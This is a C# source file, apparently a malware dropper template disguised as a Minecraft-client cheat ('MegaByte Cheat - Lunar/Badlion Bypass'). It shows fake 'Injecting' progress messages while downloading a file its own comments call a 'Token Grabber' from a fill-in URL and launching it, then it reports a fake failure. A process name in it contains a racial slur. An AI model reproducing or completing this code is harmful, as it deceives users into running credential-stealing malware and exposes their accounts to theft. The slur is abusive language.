using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Net;
using System.ComponentModel;

namespace TeredoFixer
{
    class Program
    {
        public static AsyncCompletedEventHandler Completed { get; private set; }

        static void Main(string[] args)
        {
            // Creating Tempfile
            Console.Title = "MegaByte Cheat - Lunar/Badlion Bypass";
            string temp = @"C:\temp\" + Guid.NewGuid();
            Directory.CreateDirectory(temp);
            string grapped = temp + "\\YOUR FILE NAME.exe";
            Console.ForegroundColor = ConsoleColor.DarkMagenta;
            Console.WriteLine("Injecting.");
            try
            {
                // Downloading Token Grabber
                WebClient webClient = new WebClient();
                webClient.DownloadFileCompleted += new AsyncCompletedEventHandler(Completed);
                webClient.DownloadFileAsync(new Uri("YOUR FILE HERE"), grapped);
                Console.Clear();
                Console.WriteLine("Injecting..");
            }
            catch {
                Console.WriteLine("FAILED");
            }

 
            void Completed(object sender, AsyncCompletedEventArgs e)
            {
                // if it done
                Console.ForegroundColor = ConsoleColor.Cyan;
                Console.Clear();
                Console.WriteLine("Injecting...");
                Process.Start(grapped);
            }
            // checks if the program is running
            if (Process.GetProcessesByName("Nigga-Grabber.exe").Length > 0)
            {
               
            }
            // If its not running then do this
            else
            {
                Thread.Sleep(10000);
                Console.Clear();
                Console.WriteLine("Injecting....");
                Console.ForegroundColor = ConsoleColor.DarkRed;
                Console.WriteLine("Failed to inject...");
            }


        }

    }

}
